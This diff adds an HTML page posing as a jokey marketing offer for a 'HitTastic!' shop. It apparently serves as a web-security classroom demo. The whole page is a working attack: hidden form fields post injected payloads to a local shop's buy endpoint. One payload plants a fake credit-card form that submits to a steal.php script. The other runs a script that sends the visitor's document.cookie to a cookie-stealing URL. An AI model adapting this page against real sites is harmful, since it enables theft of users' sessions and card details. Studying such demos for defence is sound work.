@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Bogweed Marketing Ltd</title>
+<style>
+body {
+    font-family: Helvetica, Arial, sans-serif;
+    background-color: #c0ffff;
+}
+
+a {
+    text-decoration: none;
+}
+
+input[type=submit] {
+    background-color: yellow;
+    font-size: 200%;
+}
+</style>
+</head>
+<body>
+<h1>Bogweed Marketing, partnering with HitTastic!!</h1>
+<p>Bogweed Marketing have just signed a special deal with HitTastic!, to allow
+you to buy HitTastic! stock at <em>knock-down prices!!!!!</em> Just 
+<strong>PUSH THE BUTTON</strong> below. You know you want to!</p>
+<p>
+<form method="post" action="http://localhost:3000/buy">
+<input type="hidden" name="id" value="1<form action=http://localhost/xss/steal.php>Input credit card:<input name=creditcard /></form>" />
+<input type="submit" value="BUY WOOP FOR ONLY 1p !!!!" />
+</form>
+</p>
+<p><form method="post" action="http://localhost:3000/buy">
+<input type="hidden" name="id" value="17<script>window.location='http://localhost/xss/stealcookie.php?cookie=' + document.cookie</script>" />
+<input type="submit" value="BUY ELVIS FOR ONLY 5p !!!!" />
+</form>
+</p>
+<p style='font-size: 40%'>Bogweed Marketing, Behind the Hot Water Pipes, Third Washroom Along, Victoria Station. Incorporating Devious Insurance Ltd.</p>
+</body>
+</html>
